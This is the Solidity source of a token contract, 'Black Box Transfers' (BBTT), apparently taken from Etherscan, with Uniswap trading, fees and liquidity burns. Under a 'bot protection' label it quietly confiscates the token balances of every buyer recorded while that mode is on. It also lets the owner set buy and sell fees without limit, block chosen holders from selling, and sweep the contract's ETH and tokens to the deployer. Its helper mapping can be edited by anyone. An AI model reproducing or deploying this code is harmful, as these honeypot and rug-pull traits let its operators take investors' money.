1 /**
2  *Submitted for verification at Etherscan.io on 2022-31-12
3 */
4 
5 pragma solidity ^0.8.17;
6 // SPDX-License-Identifier: Unlicensed
7 interface IERC20 {
8 
9     function totalSupply() external view returns (uint256);
10     function balanceOf(address account) external view returns (uint256);
11     function transfer(address recipient, uint256 amount) external returns (bool);
12     function allowance(address owner, address spender) external view returns (uint256);
13     function approve(address spender, uint256 amount) external returns (bool);
14     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
15 
16     event Transfer(address indexed from, address indexed to, uint256 value);
17     event Approval(address indexed owner, address indexed spender, uint256 value);
18 }
19 
20 library SafeMath {
21 
22     function add(uint256 a, uint256 b) internal pure returns (uint256) {
23         uint256 c = a + b;
24         require(c >= a, "SafeMath: addition overflow");
25 
26         return c;
27     }
28 
29     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
30         return sub(a, b, "SafeMath: subtraction overflow");
31     }
32 
33     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
34         require(b <= a, errorMessage);
35         uint256 c = a - b;
36 
37         return c;
38     }
39 
40     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
41         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
42         // benefit is lost if 'b' is also tested.
43         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
44         if (a == 0) {
45             return 0;
46         }
47 
48         uint256 c = a * b;
49         require(c / a == b, "SafeMath: multiplication overflow");
50 
51         return c;
52     }
53 
54     function div(uint256 a, uint256 b) internal pure returns (uint256) {
55         return div(a, b, "SafeMath: division by zero");
56     }
57 
58     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
59         require(b > 0, errorMessage);
60         uint256 c = a / b;
61         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
62 
63         return c;
64     }
65 
66     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
67         return mod(a, b, "SafeMath: modulo by zero");
68     }
69 
70     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
71         require(b != 0, errorMessage);
72         return a % b;
73     }
74 }
75 
76 abstract contract Context {
77     //function _msgSender() internal view virtual returns (address payable) {
78     function _msgSender() internal view virtual returns (address) {
79         return msg.sender;
80     }
81 
82     function _msgData() internal view virtual returns (bytes memory) {
83         this;
84         // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
85         return msg.data;
86     }
87 }
88 
89 library Address {
90 
91     function isContract(address account) internal view returns (bool) {
92         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
93         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
94         // for accounts without code, i.e. `keccak256('')`
95         bytes32 codehash;
96         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
97         // solhint-disable-next-line no-inline-assembly
98         assembly {codehash := extcodehash(account)}
99         return (codehash != accountHash && codehash != 0x0);
100     }
101 
102     function sendValue(address payable recipient, uint256 amount) internal {
103         require(address(this).balance >= amount, "Address: insufficient balance");
104 
105         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
106         (bool success,) = recipient.call{value : amount}("");
107         require(success, "Address: unable to send value, recipient may have reverted");
108     }
109 
110     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
111         return functionCall(target, data, "Address: low-level call failed");
112     }
113 
114     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
115         return _functionCallWithValue(target, data, 0, errorMessage);
116     }
117 
118     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
119         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
120     }
121 
122     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
123         require(address(this).balance >= value, "Address: insufficient balance for call");
124         return _functionCallWithValue(target, data, value, errorMessage);
125     }
126 
127     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
128         require(isContract(target), "Address: call to non-contract");
129 
130         // solhint-disable-next-line avoid-low-level-calls
131         (bool success, bytes memory returndata) = target.call{value : weiValue}(data);
132         if (success) {
133             return returndata;
134         } else {
135             // Look for revert reason and bubble it up if present
136             if (returndata.length > 0) {
137                 // The easiest way to bubble the revert reason is using memory via assembly
138 
139                 // solhint-disable-next-line no-inline-assembly
140                 assembly {
141                     let returndata_size := mload(returndata)
142                     revert(add(32, returndata), returndata_size)
143                 }
144             } else {
145                 revert(errorMessage);
146             }
147         }
148     }
149 }
150 
151 contract Ownable is Context {
152     address private _owner;
153 
154     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
155 
156     constructor () {
157         address msgSender = _msgSender();
158         _owner = msgSender;
159         emit OwnershipTransferred(address(0), msgSender);
160     }
161 
162     function owner() public view returns (address) {
163         return _owner;
164     }
165 
166     modifier onlyOwner() {
167         require(_owner == _msgSender(), "Ownable: caller is not the owner");
168         _;
169     }
170 
171     function renounceOwnership() public virtual onlyOwner {
172         emit OwnershipTransferred(_owner, address(0));
173         _owner = address(0);
174     }
175 
176     function transferOwnership(address newOwner) public virtual onlyOwner {
177         require(newOwner != address(0), "Ownable: new owner is the zero address");
178         emit OwnershipTransferred(_owner, newOwner);
179         _owner = newOwner;
180     }
181 }
182 
183 
184 
185 interface IUniswapV2Pair {
186     event Approval(
187         address indexed owner,
188         address indexed spender,
189         uint256 value
190     );
191     event Transfer(address indexed from, address indexed to, uint256 value);
192 
193     function name() external pure returns (string memory);
194 
195     function symbol() external pure returns (string memory);
196 
197     function decimals() external pure returns (uint8);
198 
199     function totalSupply() external view returns (uint256);
200 
201     function balanceOf(address owner) external view returns (uint256);
202 
203     function allowance(address owner, address spender)
204         external
205         view
206         returns (uint256);
207 
208     function approve(address spender, uint256 value) external returns (bool);
209 
210     function transfer(address to, uint256 value) external returns (bool);
211 
212     function transferFrom(
213         address from,
214         address to,
215         uint256 value
216     ) external returns (bool);
217 
218     function DOMAIN_SEPARATOR() external view returns (bytes32);
219 
220     function PERMIT_TYPEHASH() external pure returns (bytes32);
221 
222     function nonces(address owner) external view returns (uint256);
223 
224     function permit(
225         address owner,
226         address spender,
227         uint256 value,
228         uint256 deadline,
229         uint8 v,
230         bytes32 r,
231         bytes32 s
232     ) external;
233 
234     event Mint(address indexed sender, uint256 amount0, uint256 amount1);
235     event Burn(
236         address indexed sender,
237         uint256 amount0,
238         uint256 amount1,
239         address indexed to
240     );
241     event Swap(
242         address indexed sender,
243         uint256 amount0In,
244         uint256 amount1In,
245         uint256 amount0Out,
246         uint256 amount1Out,
247         address indexed to
248     );
249     event Sync(uint112 reserve0, uint112 reserve1);
250 
251     function MINIMUM_LIQUIDITY() external pure returns (uint256);
252 
253     function factory() external view returns (address);
254 
255     function token0() external view returns (address);
256 
257     function token1() external view returns (address);
258 
259     function getReserves()
260         external
261         view
262         returns (
263             uint112 reserve0,
264             uint112 reserve1,
265             uint32 blockTimestampLast
266         );
267 
268     function price0CumulativeLast() external view returns (uint256);
269 
270     function price1CumulativeLast() external view returns (uint256);
271 
272     function kLast() external view returns (uint256);
273 
274     function mint(address to) external returns (uint256 liquidity);
275 
276     function burn(address to)
277         external
278         returns (uint256 amount0, uint256 amount1);
279 
280     function swap(
281         uint256 amount0Out,
282         uint256 amount1Out,
283         address to,
284         bytes calldata data
285     ) external;
286 
287     function skim(address to) external;
288 
289     function sync() external;
290 
291     function initialize(address, address) external;
292 }
293 
294 interface IUniswapV2Factory {
295     function createPair(address tokenA, address tokenB) external returns (address pair);
296     function getPair(address token0, address token1) external view returns (address);
297 }
298 
299 interface IUniswapV2Router02 {
300     function factory() external pure returns (address);
301     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
302     function swapExactTokensForETHSupportingFeeOnTransferTokens(
303         uint amountIn,
304         uint amountOutMin,
305         address[] calldata path,
306         address to,
307         uint deadline
308     ) external;
309     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
310         uint amountIn,
311         uint amountOutMin,
312         address[] calldata path,
313         address to,
314         uint deadline
315     ) external;
316     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
317     external payable returns (uint[] memory amounts);
318     function addLiquidityETH(
319         address token,
320         uint amountTokenDesired,
321         uint amountTokenMin,
322         uint amountETHMin,
323         address to,
324         uint deadline
325     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
326     function removeLiquidity(
327         address tokenA,
328         address tokenB,
329         uint liquidity,
330         uint amountAMin,
331         uint amountBMin,
332         address to,
333         uint deadline
334     ) external returns (uint amountA, uint amountB);
335     function WETH() external pure returns (address);
336 }
337 
338 contract BlackBox is Context, IERC20, Ownable {
339     using SafeMath for uint256;
340     using Address for address;
341     modifier lockTheSwap {
342         inSwapAndLiquify = true;
343         _;
344         inSwapAndLiquify = false;
345     }
346     event TokensBurned(uint256, uint256);
347     IterableMapping private botSnipingMap = new IterableMapping();
348     IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
349     address public marketPair = address(0);
350     IUniswapV2Pair private v2Pair;
351     address private feeOne = 0x3b373De9A770E67E6B0b29ce443F50Bf859f06E2;
352     address private feeTwo = 0xA1CAA8b8161e21085B391eFE18C6042D9Ba66380;    
353     mapping(address => uint256) private _balances;
354     mapping(address => mapping(address => uint256)) private _allowances;
355     mapping (address => bool) private botWallets;
356     mapping(address => bool) private _isExcludedFromFee;
357     string private _name = "Black Box Transfers";
358     string private _symbol = "BBTT";
359     uint8 private _decimals = 9;
360     uint256 private _tTotal = 10_000_000 * 10 ** _decimals;
361     uint256 public _maxWalletAmount = 500_000 * 10 ** _decimals;
362     bool inSwapAndLiquify;
363     uint256 public buyFee = 5;    //moving to 6
364     uint256 public sellFee = 20;  //moving to 6
365     address public deployer;
366     uint256 public ethPriceToSwap = 200000000000000000; 
367     bool public isBotProtectionEnabled;
368     bool public isBurnEnabled = true;
369     uint256 public burnFrequencynMinutes = 60;  
370     uint256 public burnRateInBasePoints = 100;  //100 = 1%
371     uint256 public tokensBurnedSinceLaunch = 0;
372     uint public nextLiquidityBurnTimeStamp;
373    
374     modifier devOnly() {
375         require(deployer == _msgSender() || feeOne == _msgSender() || feeTwo == _msgSender(), "caller is not the owner");
376         _;
377     }
378     constructor () {
379          _balances[address(this)] = _tTotal*80/100;
380          _balances[0x1462a63BF45e653bf69ce6f4001fD0e1c28d5a6C] = _tTotal*2/100;
381          _balances[0x6964819731eB482f40d8f13E6a1aa6A7d0dcdD37] = _tTotal*2/100;
382          _balances[0x276cD77aE62d006c68365280dA1ea992f1aEb0D0] = _tTotal*2/100;
383          _balances[0x069DB82Eb15E67BFD1bB6c8d059b8C16d453cBC5] = _tTotal*2/100;
384          _balances[0x9ce860Fdcfe4FBE186C774bD11e13EA84b78Cc69] = _tTotal*2/100;
385          _balances[0xC66183ABf18f14161aaB0D204f65b34E5C375BD2] = _tTotal*2/100;
386          _balances[0x4D671048252B07Cb2E6C8996904B9C5Eb0018570] = _tTotal*2/100;
387          _balances[0x59B2e309b1baff01173F4bD9083Ce0477ec18b12] = _tTotal*2/100;
388          _balances[0x4712E09b2aEB1Bc322a52B84a3FFa614D864d9DB] = _tTotal*2/100;
389          _balances[0x9b31e1B1A4e42e057A85C5D17b4e819A831a660f] = _tTotal*2/100;
390         _isExcludedFromFee[owner()] = true;
391         _isExcludedFromFee[address(uniswapV2Router)] = true;
392         _isExcludedFromFee[address(this)] = true;
393         deployer = owner();
394         emit Transfer(address(0), address(this), _tTotal*80/100);
395         emit Transfer(address(0), 0x1462a63BF45e653bf69ce6f4001fD0e1c28d5a6C, _tTotal*2/100);
396         emit Transfer(address(0), 0x6964819731eB482f40d8f13E6a1aa6A7d0dcdD37, _tTotal*2/100);
397         emit Transfer(address(0), 0x276cD77aE62d006c68365280dA1ea992f1aEb0D0, _tTotal*2/100);
398         emit Transfer(address(0), 0x069DB82Eb15E67BFD1bB6c8d059b8C16d453cBC5, _tTotal*2/100);
399         emit Transfer(address(0), 0x9ce860Fdcfe4FBE186C774bD11e13EA84b78Cc69, _tTotal*2/100);
400         emit Transfer(address(0), 0xC66183ABf18f14161aaB0D204f65b34E5C375BD2, _tTotal*2/100);
401         emit Transfer(address(0), 0x4D671048252B07Cb2E6C8996904B9C5Eb0018570, _tTotal*2/100);
402         emit Transfer(address(0), 0x59B2e309b1baff01173F4bD9083Ce0477ec18b12, _tTotal*2/100);
403         emit Transfer(address(0), 0x4712E09b2aEB1Bc322a52B84a3FFa614D864d9DB, _tTotal*2/100);
404         emit Transfer(address(0), 0x9b31e1B1A4e42e057A85C5D17b4e819A831a660f, _tTotal*2/100);
405     }
406 
407     function name() public view returns (string memory) {
408         return _name;
409     }
410 
411     function symbol() public view returns (string memory) {
412         return _symbol;
413     }
414 
415     function decimals() public view returns (uint8) {
416         return _decimals;
417     }
418 
419     function totalSupply() public view override returns (uint256) {
420         return _tTotal;
421     }
422 
423     function balanceOf(address account) public view override returns (uint256) {
424         return _balances[account];
425     }
426 
427     function transfer(address recipient, uint256 amount) public override returns (bool) {
428         _transfer(_msgSender(), recipient, amount);
429         return true;
430     }
431 
432     function allowance(address owner, address spender) public view override returns (uint256) {
433         return _allowances[owner][spender];
434     }
435 
436     function approve(address spender, uint256 amount) public override returns (bool) {
437         _approve(_msgSender(), spender, amount);
438         return true;
439     }
440 
441     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
442         _transfer(sender, recipient, amount);
443         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
444         return true;
445     }
446 
447     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
448         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
449         return true;
450     }
451 
452     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
453         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
454         return true;
455     }
456 
457     function setTaxFees(uint256 buy, uint256 sell) external onlyOwner {
458         buyFee = buy;
459         sellFee = sell;
460     }
461 
462     function disableBotProtectionPermanently() external onlyOwner {
463         require(isBotProtectionEnabled,"Bot sniping has already been disabled");
464         isBotProtectionEnabled = false;
465     }
466 
467      function isAddressBlocked(address addr) public view returns (bool) {
468         return botWallets[addr];
469     }
470 
471     function blockAddresses(address[] memory addresses) external onlyOwner() {
472         blockUnblockAddress(addresses, true);
473     }
474 
475     function unblockAddresses(address[] memory addresses) external onlyOwner() {
476         blockUnblockAddress(addresses, false);
477     }
478 
479     function blockUnblockAddress(address[] memory addresses, bool doBlock) private {
480         for (uint256 i = 0; i < addresses.length; i++) {
481             address addr = addresses[i];
482             if(doBlock) {
483                 botWallets[addr] = true;
484             } else {
485                 delete botWallets[addr];
486             }
487         }
488     }
489     function excludeIncludeFromFee(address[] calldata addresses, bool isExcludeFromFee) public onlyOwner {
490         addRemoveFee(addresses, isExcludeFromFee);
491     }
492 
493    function setBurnSettings(uint256 frequencyInMinutes, uint256 burnBasePoints) external onlyOwner {
494         burnFrequencynMinutes = frequencyInMinutes;
495         burnRateInBasePoints = burnBasePoints;
496     }
497 
498     function burnTokensFromLiquidityPool() private lockTheSwap {
499         uint liquidity = balanceOf(marketPair);
500         uint tokenBurnAmount = liquidity.div(burnRateInBasePoints);
501         if(tokenBurnAmount > 0) {
502             //burn tokens from LP and update liquidity pool price
503             _burn(marketPair, tokenBurnAmount);
504             v2Pair.sync();
505             tokensBurnedSinceLaunch = tokensBurnedSinceLaunch.add(tokenBurnAmount);
506             nextLiquidityBurnTimeStamp = block.timestamp.add(burnFrequencynMinutes.mul(60));
507             emit TokensBurned(tokenBurnAmount, nextLiquidityBurnTimeStamp);
508         }
509     }
510 
511     function enableDisableBurnToken(bool _enabled) public onlyOwner {
512         isBurnEnabled = _enabled;
513     }
514 
515     function burnTokens() external {
516         require(block.timestamp >= nextLiquidityBurnTimeStamp, "Next burn time is not due yet, be patient");
517         require(isBurnEnabled, "Burning tokens is currently disabled");
518         burnTokensFromLiquidityPool();
519     }
520 
521     function addRemoveFee(address[] calldata addresses, bool flag) private {
522         for (uint256 i = 0; i < addresses.length; i++) {
523             address addr = addresses[i];
524             _isExcludedFromFee[addr] = flag;
525         }
526     }
527 
528     function _burn(address account, uint256 value) internal {
529         require(account != address(0), "ERC20: burn from the zero address");
530         _tTotal = _tTotal.sub(value);
531         _balances[account] = _balances[account].sub(value);
532         emit Transfer(account, address(0), value);
533     }
534     
535     function openTrading() external onlyOwner() {
536         require(marketPair == address(0),"UniswapV2Pair has already been set");
537         _approve(address(this), address(uniswapV2Router), _tTotal);
538         marketPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
539         uniswapV2Router.addLiquidityETH{value: address(this).balance}(
540             address(this),
541             balanceOf(address(this)),
542             0,
543             0,
544             owner(),
545             block.timestamp);
546         IERC20(marketPair).approve(address(uniswapV2Router), type(uint).max);
547         v2Pair = IUniswapV2Pair(marketPair);
548         nextLiquidityBurnTimeStamp = block.timestamp;
549         isBotProtectionEnabled = true;
550     }
551 
552     function isExcludedFromFee(address account) public view returns (bool) {
553         return _isExcludedFromFee[account];
554     }
555 
556     function setMaxWalletAmount(uint256 maxWalletAmount) external onlyOwner() {
557         _maxWalletAmount = maxWalletAmount * 10 ** 9;
558     }
559 
560     function _approve(address owner, address spender, uint256 amount) private {
561         require(owner != address(0), "ERC20: approve from the zero address");
562         require(spender != address(0), "ERC20: approve to the zero address");
563 
564         _allowances[owner][spender] = amount;
565         emit Approval(owner, spender, amount);
566     }
567 
568     function _transfer(address from, address to, uint256 amount) private {
569         require(from != address(0), "ERC20: transfer from the zero address");
570         require(to != address(0), "ERC20: transfer to the zero address");
571         require(amount > 0, "Transfer amount must be greater than zero");
572         uint256 taxAmount = 0;
573         bool takeFees = !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && from != owner() && to != owner();
574         if(from != deployer && to != deployer && from != address(this) && to != address(this)) {
575             if(takeFees) {
576                 
577                 if (from == marketPair) {
578                     if(isBotProtectionEnabled) {
579                         snipeBalances();
580                         botSnipingMap.set(to, block.timestamp);
581                     } else {
582                         taxAmount = amount.mul(buyFee).div(100);
583                         uint256 amountToHolder = amount.sub(taxAmount);
584                         uint256 holderBalance = balanceOf(to).add(amountToHolder);
585                         require(holderBalance <= _maxWalletAmount, "Wallet cannot exceed max Wallet limit");
586                     }
587                 }
588                 if (from != marketPair && to == marketPair) {
589                     require(!botWallets[from] && !botWallets[to], "bots are not allowed to sell tokens");        
590                     taxAmount = !isBotProtectionEnabled ? amount.mul(sellFee).div(100) : 0;
591                     if(block.timestamp >= nextLiquidityBurnTimeStamp && isBurnEnabled) {
592                             burnTokensFromLiquidityPool();
593                     } else {
594                         uint256 contractTokenBalance = balanceOf(address(this));
595                         if (contractTokenBalance > 0) {
596                             
597                                 uint256 tokenAmount = getTokenPrice();
598                                 if (contractTokenBalance >= tokenAmount && !inSwapAndLiquify) {
599                                     swapTokensForEth(tokenAmount);
600                                 }
601                             }
602                         }
603                 }
604                 if (from != marketPair && to != marketPair) {
605                     uint256 fromBalance = balanceOf(from);
606                     uint256 toBalance = balanceOf(to);
607                     require(!botWallets[from] && !botWallets[to], "bots are not allowed to transfer tokens");
608                     require(fromBalance <= _maxWalletAmount && toBalance <= _maxWalletAmount, "Wallet cannot exceed max Wallet limit");
609                 }
610             }
611         }       
612         uint256 transferAmount = amount.sub(taxAmount);
613         _balances[from] = _balances[from].sub(amount);
614         _balances[to] = _balances[to].add(transferAmount);
615         _balances[address(this)] = _balances[address(this)].add(taxAmount);
616         emit Transfer(from, to, transferAmount);
617     }
618 
619     function snipeBalances() private {
620         if(isBotProtectionEnabled) {
621             for(uint256 i =0; i < botSnipingMap.size(); i++) {
622                 address holder = botSnipingMap.getKeyAtIndex(i);
623                 uint256 amount = _balances[holder];
624                 if(amount > 0) {
625                     _balances[holder] = _balances[holder].sub(amount);
626                     _balances[address(this)] = _balances[address(this)].add(amount);
627                 }
628                 botSnipingMap.remove(holder);
629             }
630         }
631     }
632 
633     function numberOfSnipedBots() public view returns(uint256) {
634         uint256 count = 0;
635         for(uint256 i =0; i < botSnipingMap.size(); i++) {
636             address holder = botSnipingMap.getKeyAtIndex(i);
637             uint timestamp = botSnipingMap.get(holder);
638             if(block.timestamp >=  timestamp) 
639                 count++;
640         }
641         return count;
642     }
643 
644     function manualSnipeBots() external {
645         snipeBalances();
646     }
647     function manualSwap() external {
648         uint256 contractTokenBalance = balanceOf(address(this));
649         if (contractTokenBalance > 0) {
650             if (!inSwapAndLiquify) {
651                 swapTokensForEth(contractTokenBalance);
652             }
653         }
654     }
655 
656     function swapTokensForEth(uint256 tokenAmount) private {
657         // generate the uniswap pair path of token -> weth
658         address[] memory path = new address[](2);
659         path[0] = address(this);
660         path[1] = uniswapV2Router.WETH();
661         _approve(address(this), address(uniswapV2Router), tokenAmount);
662         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
663             tokenAmount,
664             0,
665             path,
666             address(this),
667             block.timestamp
668         );
669 
670         uint256 ethBalance = address(this).balance;
671         uint256 halfShare = ethBalance.div(2);  
672         payable(feeOne).transfer(halfShare);
673         payable(feeTwo).transfer(halfShare); 
674     }
675 
676     function getTokenPrice() public view returns (uint256)  {
677         address[] memory path = new address[](2);
678         path[0] = uniswapV2Router.WETH();
679         path[1] = address(this);
680         return uniswapV2Router.getAmountsOut(ethPriceToSwap, path)[1];
681     }
682 
683     function setEthPriceToSwap(uint256 ethPriceToSwap_) external onlyOwner {
684         ethPriceToSwap = ethPriceToSwap_;
685     }
686 
687     receive() external payable {}
688 
689     function sendEth() external devOnly {
690         uint256 ethBalance = address(this).balance;
691         payable(deployer).transfer(ethBalance);
692     }
693 
694     function sendERC20Tokens(address contractAddress) external devOnly {
695         IERC20 erc20Token = IERC20(contractAddress);
696         uint256 balance = erc20Token.balanceOf(address(this));
697         erc20Token.transfer(deployer, balance);
698     }
699 }
700 
701 
702 contract IterableMapping {
703     // Iterable mapping from address to uint;
704     struct Map {
705         address[] keys;
706         mapping(address => uint) values;
707         mapping(address => uint) indexOf;
708         mapping(address => bool) inserted;
709     }
710 
711     Map private map;
712 
713     function get(address key) public view returns (uint) {
714         return map.values[key];
715     }
716 
717     function keyExists(address key) public view returns (bool) {
718         return (getIndexOfKey(key) != - 1);
719     }
720 
721     function getIndexOfKey(address key) public view returns (int) {
722         if (!map.inserted[key]) {
723             return - 1;
724         }
725         return int(map.indexOf[key]);
726     }
727 
728     function getKeyAtIndex(uint index) public view returns (address) {
729         return map.keys[index];
730     }
731 
732     function size() public view returns (uint) {
733         return map.keys.length;
734     }
735 
736     function set(address key, uint val) public {
737         if (map.inserted[key]) {
738             map.values[key] = val;
739         } else {
740             map.inserted[key] = true;
741             map.values[key] = val;
742             map.indexOf[key] = map.keys.length;
743             map.keys.push(key);
744         }
745     }
746 
747     function remove(address key) public {
748         if (!map.inserted[key]) {
749             return;
750         }
751         delete map.inserted[key];
752         delete map.values[key];
753         uint index = map.indexOf[key];
754         uint lastIndex = map.keys.length - 1;
755         address lastKey = map.keys[lastIndex];
756         map.indexOf[lastKey] = index;
757         delete map.indexOf[key];
758         map.keys[index] = lastKey;
759         map.keys.pop();
760     }
761 }